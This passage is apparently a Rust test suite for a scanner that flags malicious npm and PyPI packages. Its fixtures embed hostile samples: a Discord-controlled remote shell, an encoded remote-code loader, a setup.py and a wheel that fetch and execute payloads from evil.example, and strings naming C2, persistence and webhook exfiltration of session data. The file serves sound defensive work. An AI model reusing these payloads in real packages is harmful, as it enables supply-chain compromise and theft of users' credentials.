    #[tokio::test]
    async fn detects_npm_discord_bot_rat_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "nodecord-rat-like",
                        "version": "1.0.0",
                        "main": "index.js",
                        "dependencies": {
                            "discord.js": "^14.0.0"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const { Client, GatewayIntentBits } = require('discord.js'); const { execSync } = require('child_process'); const client = new Client({ intents: [GatewayIntentBits.GuildMessages] }); client.on('messageCreate', async (message) => { if (message.content.startsWith('!run')) execSync('id'); if (message.content.startsWith('!cmd')) execSync(message.content.slice(4)); if (message.content.startsWith('!shell')) execSync(message.content.slice(6)); });",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "nodecord-rat-like");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_discord_bot_rat")
        );
    }

    #[tokio::test]
    async fn ignores_openclaw_like_channel_plugin_for_discord_rat_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "openclaw-like-plugin",
                        "version": "1.0.0",
                        "main": "dist/index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "dist/index.js",
                    "import './src/commands/upgrade.js'; export default { channel: { docsPath: '/channels/yuanbao' } };",
                ),
                (
                    "dist/src/commands/upgrade.js",
                    "const EXEC_TIMEOUT_MS = 3 * 60 * 1000; const regex = /foo/; export function runPluginCommandWithTimeout(input) { const shellCmd = ['bash', '-c', 'curl -fsSL https://example.invalid/install.sh'].join(' '); return regex.exec(shellCmd); }",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "openclaw-like-plugin");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_discord_bot_rat")
        );
    }

    #[tokio::test]
    async fn resolves_relative_local_artifact_path_from_capture_dir() {
        let temp = tempdir().unwrap();
        let artifacts_dir = temp.path().join("artifacts");
        fs::create_dir_all(&artifacts_dir).unwrap();
        let archive = write_npm_archive(
            &artifacts_dir,
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "winston-prism",
                        "version": "1.0.1",
                        "main": "lib/winston_prisma.js"
                    }))
                    .unwrap(),
                ),
                (
                    "lib/winston_prisma.js",
                    "exports.prismalogger = require('./winston_prisma/prismalogger');",
                ),
                (
                    "lib/winston_prisma/prismalogger.js",
                    "const axios = require('axios'); const process = { env: { DEV_API_KEY: 'aHR0cHM6Ly9leGFtcGxlLmNvbS9sb2FkZXI=', DEV_SECRET_KEY: 'eC1zZWNyZXQta2V5', DEV_SECRET_VALUE: 'Xw==' } }; (async function run() { const src = atob(process.env.DEV_API_KEY); const k = atob(process.env.DEV_SECRET_KEY); const v = atob(process.env.DEV_SECRET_VALUE); const s = (await axios.get(src, { headers: { [k]: v } })).data.logger; const handler = new Function.constructor('require', s); handler(require); })();",
                ),
            ],
        );

        let relative = Path::new(&archive)
            .strip_prefix(temp.path())
            .unwrap()
            .to_string_lossy()
            .to_string();
        let mut capture = sample_capture(Ecosystem::Npm, "winston-prism");
        capture.version = "1.0.1".to_string();
        capture.details["local_artifact"] = json!({ "path": relative });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_runtime_encoded_remote_loader")
        );
    }

    #[tokio::test]
    async fn detects_hidden_windows_launcher_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "separadordeinfocc",
                        "version": "1.0.0",
                        "main": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const c2='ws://18.231.131.246:80'; const launcher='wscript.exe'; const persistence='Add-MpPreference'; console.log(c2, launcher, persistence);",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "separadordeinfocc");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_hidden_windows_script_launcher")
        );
    }

    #[tokio::test]
    async fn detects_npm_exfil_channel_with_theft_markers_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "session-exfil",
                        "version": "1.0.0",
                        "main": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const hook='https://discord.com/api/webhooks/123/abc'; const db='Local Storage\\\\leveldb'; console.log(hook, db);",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "session-exfil");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_exfil_channel_with_theft_markers")
        );
    }

    #[tokio::test]
    async fn detects_wallet_or_session_theft_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "session-pkg",
                        "version": "1.0.0",
                        "main": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const a='discord_desktop_core'; const b='Local Storage\\\\leveldb'; console.log(a, b);",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "session-pkg");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_wallet_or_session_theft_markers")
        );
    }

    #[tokio::test]
    async fn detects_openclaw_qbot_family_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@qqbrowser/openclaw-qbot",
                        "version": "0.0.134",
                        "bin": {
                            "qb-qbot-claw": "bin/qbot.js"
                        },
                        "dependencies": {
                            "koffi": "^2.0.0",
                            "tar": "^7.0.0",
                            "ws": "^8.0.0"
                        }
                    }))
                    .unwrap(),
                ),
                ("bin/qbot.js", "console.log('qbot');"),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@qqbrowser/openclaw-qbot");
        capture.version = "0.0.134".to_string();
        capture.details["bin"] = json!({ "qb-qbot-claw": "bin/qbot.js" });
        capture.details["dependencies"] = json!(["koffi", "tar", "ws"]);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_openclaw_qbot_family")
        );
    }

    #[tokio::test]
    async fn npm_scan_ignores_vendored_manifest_noise() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "totally-benign",
                        "version": "1.0.0",
                        "main": "index.js",
                        "author": "good",
                    }))
                    .unwrap(),
                ),
                ("index.js", "console.log('benign');"),
                (
                    "node_modules/separadordeinfocc/package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "separadordeinfocc",
                        "version": "1.0.0",
                        "main": "index.js",
                        "bin": "index.js",
                        "author": "ConsoleLofy",
                        "packageManager": "pnpm@10.8.0",
                        "pkg": {
                            "targets": ["node20-win-x64"]
                        },
                        "dependencies": {
                            "@primno/dpapi": "^1.0.2",
                            "koffi": "^2.0.0",
                            "sqlite3": "^5.0.0",
                            "screenshot-desktop": "^1.0.0",
                            "rcedit": "^3.0.0",
                            "ws": "^8.0.0"
                        }
                    }))
                    .unwrap(),
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "totally-benign");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_consolelofy_stealer_manifest")
        );
    }

    #[tokio::test]
    async fn ignores_benign_google_style_installer() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@googleworkspace/cli",
                        "version": "0.22.4",
                        "scripts": {
                            "postinstall": "node ./scripts/install.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "scripts/install.js",
                    "import https from 'node:https'; console.log('download github release tarball');",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@googleworkspace/cli");
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(!signal.matches.iter().any(|matched| matched.score >= 8));
    }

    #[tokio::test]
    async fn ignores_benign_prisma_style_generator_postinstall() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@prisma/client",
                        "version": "6.19.3",
                        "scripts": {
                            "postinstall": "node scripts/postinstall.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "scripts/postinstall.js",
                    "// https://pnpm.io/only-allow-pnpm\nconst childProcess = require('child_process');\nconst { promisify } = require('util');\nconst exec = promisify(childProcess.exec);\nasync function run() { await exec('prisma -v'); }\nrun();\n",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@prisma/client");
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_downloader_and_exec_installer" })
        );
    }

    #[tokio::test]
    async fn ignores_transparent_github_release_binary_bootstrap_installer() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@acpfx/mic-speaker",
                        "version": "0.4.4",
                        "scripts": {
                            "postinstall": "node scripts/postinstall.js"
                        },
                        "repository": {
                            "type": "git",
                            "url": "https://github.com/thisnick/acpfx",
                            "directory": "packages/node-mic-speaker"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "scripts/postinstall.js",
                    "const https = require('https'); const fs = require('fs'); const path = require('path'); const { execSync } = require('child_process'); function hasNvidiaGpu() { try { execSync('nvidia-smi', { stdio: 'ignore' }); return true; } catch { return false; } } async function main() { const pkg = require('../package.json'); const version = pkg.version; const binaryName = hasNvidiaGpu() ? 'mic-speaker-linux-x64-cuda' : 'mic-speaker-linux-x64'; const destPath = path.join(__dirname, '..', 'bin', binaryName); const url = `https://github.com/thisnick/acpfx/releases/download/%40acpfx/mic-speaker%40${version}/${binaryName}`; const data = await new Promise((resolve, reject) => https.get(url, (res) => { const chunks = []; res.on('data', (chunk) => chunks.push(chunk)); res.on('end', () => resolve(Buffer.concat(chunks))); res.on('error', reject); }).on('error', reject)); fs.mkdirSync(path.dirname(destPath), { recursive: true }); fs.writeFileSync(destPath, data); fs.chmodSync(destPath, 0o755); } main();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@acpfx/mic-speaker");
        capture.version = "0.4.4".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(!signal.matches.iter().any(|matched| {
            matched.rule_id == "npm_downloader_and_exec_installer"
                || matched.rule_id == "npm_downloader_pipe_to_shell_installer"
        }));
    }

    #[tokio::test]
    async fn ignores_transparent_github_release_archive_extractor_installer() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@harvey-au/hover",
                        "version": "0.1.2",
                        "bin": {
                            "hover": "bin/hover"
                        },
                        "scripts": {
                            "postinstall": "node install.js"
                        },
                        "repository": {
                            "type": "git",
                            "url": "https://github.com/Harvey-AU/hover"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "install.js",
                    "const { execFileSync } = require('child_process'); const fs = require('fs'); const https = require('https'); const path = require('path'); const REPO = 'Harvey-AU/hover'; const BIN_DIR = path.join(__dirname, 'bin'); async function main() { const version = require('./package.json').version; const url = `https://github.com/${REPO}/releases/download/cli-v${version}/hover_${version}_linux_amd64.tar.gz`; const data = await new Promise((resolve, reject) => https.get(url, (res) => { const chunks = []; res.on('data', (c) => chunks.push(c)); res.on('end', () => resolve(Buffer.concat(chunks))); res.on('error', reject); }).on('error', reject)); fs.mkdirSync(BIN_DIR, { recursive: true }); const tmpFile = path.join(BIN_DIR, '_download.tar.gz'); fs.writeFileSync(tmpFile, data); execFileSync('tar', ['xzf', tmpFile, '-C', BIN_DIR], { stdio: 'ignore' }); } main();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@harvey-au/hover");
        capture.version = "0.1.2".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_downloader_and_exec_installer" })
        );
    }

    #[tokio::test]
    async fn ignores_benign_install_telemetry_without_identity_probe() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "telemetry-helper",
                        "version": "1.0.0",
                        "scripts": {
                            "postinstall": "node scripts/postinstall.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "scripts/postinstall.js",
                    "const https = require('https'); const os = require('os'); const body = JSON.stringify({ hostname: os.hostname(), platform: os.platform() }); const req = https.request({ hostname: 'telemetry.example.com', path: '/collect', method: 'POST' }, () => {}); req.write(body); req.end();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "telemetry-helper");
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_install_environment_callback_probe" })
        );
    }

    #[tokio::test]
    async fn ignores_benign_runtime_telemetry_without_reconnaissance_probe() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "runtime-telemetry-helper",
                        "version": "1.0.0",
                        "main": "index.js",
                        "bin": {
                            "runtime-telemetry-helper": "index.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const https = require('https'); const os = require('os'); const body = JSON.stringify({ hostname: os.hostname(), platform: os.platform() }); const req = https.request({ hostname: 'telemetry.example.com', path: '/collect', method: 'POST' }, () => {}); req.write(body); req.end();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "runtime-telemetry-helper");
        capture.details["bin"] = json!({ "runtime-telemetry-helper": "index.js" });
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_runtime_environment_callback_probe" })
        );
    }

    #[tokio::test]
    async fn ignores_runtime_security_tooling_without_callback_probe_execution() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "hackmyagent-like",
                        "version": "0.13.1",
                        "main": "dist/index.js",
                        "bin": {
                            "hackmyagent-like": "dist/cli.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "dist/index.js",
                    "module.exports = { suspiciousWatchlist: ['hookbin.com', 'burpcollaborator', 'interact.sh', 'oastify.com'] };",
                ),
                (
                    "dist/cli.js",
                    "const { execSync } = require('child_process'); const home = require('os').homedir(); const repo = execSync('git remote get-url origin', { encoding: 'utf8' }).trim(); const url = process.env.REGISTRY_URL || 'https://api.example.com/register'; fetch(url, { method: 'POST', body: JSON.stringify({ repo, home }) });",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "hackmyagent-like");
        capture.details["bin"] = json!({ "hackmyagent-like": "dist/cli.js" });
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_runtime_environment_callback_probe" })
        );
    }

    #[tokio::test]
    async fn ignores_runtime_cli_bootstrap_without_collaborator_callback_marker() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "dvb-runtime-like",
                        "version": "1.0.391",
                        "bin": {
                            "dvb": "dist/bin/dvb.cjs"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "dist/bin/dvb.cjs",
                    "const { spawnSync } = require('node:child_process'); const os = require('os'); const body = JSON.stringify({ home: process.env.HOME ?? os.homedir(), pid: process.pid, argv: process.argv, cmd: 'whoami' }); spawnSync('which', ['ssh'], { stdio: 'ignore' }); fetch('https://api.boxes.example.com/runtime', { method: 'POST', body });",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "dvb-runtime-like");
        capture.details["bin"] = json!({ "dvb": "dist/bin/dvb.cjs" });
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_runtime_environment_callback_probe" })
        );
    }

    #[tokio::test]
    async fn ignores_packaging_script_targets_for_installer_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "clay-server",
                        "version": "2.20.0-beta.4",
                        "scripts": {
                            "prepack": "node ./bin/cli.js",
                            "postpack": "node ./bin/cli.js"
                        },
                        "bin": {
                            "clay-server": "./bin/cli.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "bin/cli.js",
                    "const https = require('https'); const { exec } = require('child_process'); console.log(https, exec);",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "clay-server");
        capture.version = "2.20.0-beta.4".to_string();
        capture.details["bin"] = json!({ "clay-server": "./bin/cli.js" });
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_downloader_and_exec_installer" })
        );
    }

    #[tokio::test]
    async fn ignores_npm_webhook_notifier_without_theft_markers() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "webhook-notifier",
                        "version": "1.0.0",
                        "main": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const hook='https://discord.com/api/webhooks/123/abc'; console.log(hook);",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "webhook-notifier");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_exfil_channel_with_theft_markers" })
        );
    }

    #[tokio::test]
    async fn ignores_benign_websocket_entrypoint_without_stealth_or_persistence() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "ws-helper",
                        "version": "1.0.0",
                        "main": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const endpoint='ws://localhost:3000'; console.log(endpoint);",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "ws-helper");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_hidden_windows_script_launcher")
        );
    }

    #[tokio::test]
    async fn ignores_base64_blob_without_unpacking_behavior() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "asset-helper",
                        "version": "1.0.0",
                        "main": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const data = Buffer.from('ZmFrZQ==', 'base64'); console.log(data.toString('utf-8'));",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "asset-helper");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_base64_xor_self_unpacking_loader")
        );
    }

    #[tokio::test]
    async fn ignores_nyx_hidden_string_without_family_or_obfuscated_loader() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "harmless-nyx-env",
                        "version": "1.0.0",
                        "main": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "if (!process.env._NYX_HIDDEN) { console.log('flag only'); }",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "harmless-nyx-env");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_nyx_hidden_obfuscated_loader")
        );
    }

    #[tokio::test]
    async fn ignores_partial_qbot_like_package_without_full_family_fingerprint() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@qqbrowser/openclaw-qbot",
                        "version": "0.0.134",
                        "bin": {
                            "qb-qbot-claw": "bin/qbot.js"
                        },
                        "dependencies": {
                            "koffi": "^2.0.0",
                            "ws": "^8.0.0"
                        }
                    }))
                    .unwrap(),
                ),
                ("bin/qbot.js", "console.log('qbot');"),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@qqbrowser/openclaw-qbot");
        capture.version = "0.0.134".to_string();
        capture.details["bin"] = json!({ "qb-qbot-claw": "bin/qbot.js" });
        capture.details["dependencies"] = json!(["koffi", "ws"]);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_openclaw_qbot_family")
        );
    }

    #[tokio::test]
    async fn detects_pypi_build_hook_downloader_rule() {
        let temp = tempdir().unwrap();
        let archive = write_pypi_sdist(
            temp.path(),
            "demo-1.0.0.tar.gz",
            &[
                (
                    "demo-1.0.0/setup.py",
                    "from setuptools import setup\nimport urllib.request\ndata = urllib.request.urlopen('https://evil.example/payload.py').read()\nexec(data)\nsetup(name='demo', version='1.0.0')\n",
                ),
                ("demo-1.0.0/demo/__init__.py", "__version__='1.0.0'\n"),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Pypi, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0.tar.gz".to_string(),
            kind: Some("sdist".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "pypi_build_hook_downloader")
        );
    }

    #[tokio::test]
    async fn detects_pypi_in_memory_payload_loader_rule() {
        let temp = tempdir().unwrap();
        let archive = write_pypi_wheel(
            temp.path(),
            "demo-1.0.0-py3-none-any.whl",
            &[
                (
                    "demo-1.0.0.dist-info/METADATA",
                    "Name: demo\nVersion: 1.0.0\n",
                ),
                (
                    "demo-1.0.0.dist-info/entry_points.txt",
                    "[console_scripts]\ndemo = demo.cli:main\n",
                ),
                (
                    "demo/cli.py",
                    "import requests, subprocess\npayload = requests.get('https://evil.example/payload').text\nfd = memfd_create('x', 0)\npath = '/proc/self/fd/%d' % fd\nsubprocess.run([path])\n",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Pypi, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0-py3-none-any.whl".to_string(),
            kind: Some("bdist_wheel".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "pypi_in_memory_payload_loader")
        );
    }

    #[tokio::test]
    async fn detects_pypi_exfil_channel_with_theft_markers_rule() {
        let temp = tempdir().unwrap();
        let archive = write_pypi_wheel(
            temp.path(),
            "demo-1.0.0-py3-none-any.whl",
            &[
                (
                    "demo-1.0.0.dist-info/METADATA",
                    "Name: demo\nVersion: 1.0.0\n",
                ),
                (
                    "demo-1.0.0.dist-info/entry_points.txt",
                    "[console_scripts]\ndemo = demo.cli:main\n",
                ),
                (
                    "demo/cli.py",
                    "hook = 'https://api.telegram.org/bot12345678:ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789/sendMessage'\nmarker = 'Local Storage\\\\leveldb'\nprint(hook, marker)\n",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Pypi, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0-py3-none-any.whl".to_string(),
            kind: Some("bdist_wheel".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "pypi_exfil_channel_with_theft_markers" })
        );
    }

    #[tokio::test]
    async fn ignores_benign_pypi_build_backend_package() {
        let temp = tempdir().unwrap();
        let archive = write_pypi_wheel(
            temp.path(),
            "demo-1.0.0-py3-none-any.whl",
            &[
                (
                    "demo-1.0.0.dist-info/METADATA",
                    "Name: demo\nVersion: 1.0.0\n",
                ),
                (
                    "pyproject.toml",
                    "[build-system]\nbuild-backend = \"setuptools.build_meta\"\n[project]\nname = \"demo\"\nversion = \"1.0.0\"\n",
                ),
                (
                    "demo-1.0.0.dist-info/entry_points.txt",
                    "[console_scripts]\ndemo = demo.cli:main\n",
                ),
                ("demo/cli.py", "def main():\n    print('demo')\n"),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Pypi, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0-py3-none-any.whl".to_string(),
            kind: Some("bdist_wheel".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "pypi_build_hook_downloader")
        );
    }

    #[tokio::test]
    async fn ignores_pypi_webhook_notifier_without_theft_markers() {
        let temp = tempdir().unwrap();
        let archive = write_pypi_wheel(
            temp.path(),
            "demo-1.0.0-py3-none-any.whl",
            &[
                (
                    "demo-1.0.0.dist-info/METADATA",
                    "Name: demo\nVersion: 1.0.0\n",
                ),
                (
                    "demo-1.0.0.dist-info/entry_points.txt",
                    "[console_scripts]\ndemo = demo.cli:main\n",
                ),
                (
                    "demo/cli.py",
                    "hook = 'https://discord.com/api/webhooks/123/abc'\nprint(hook)\n",
                ),
            ],
        );

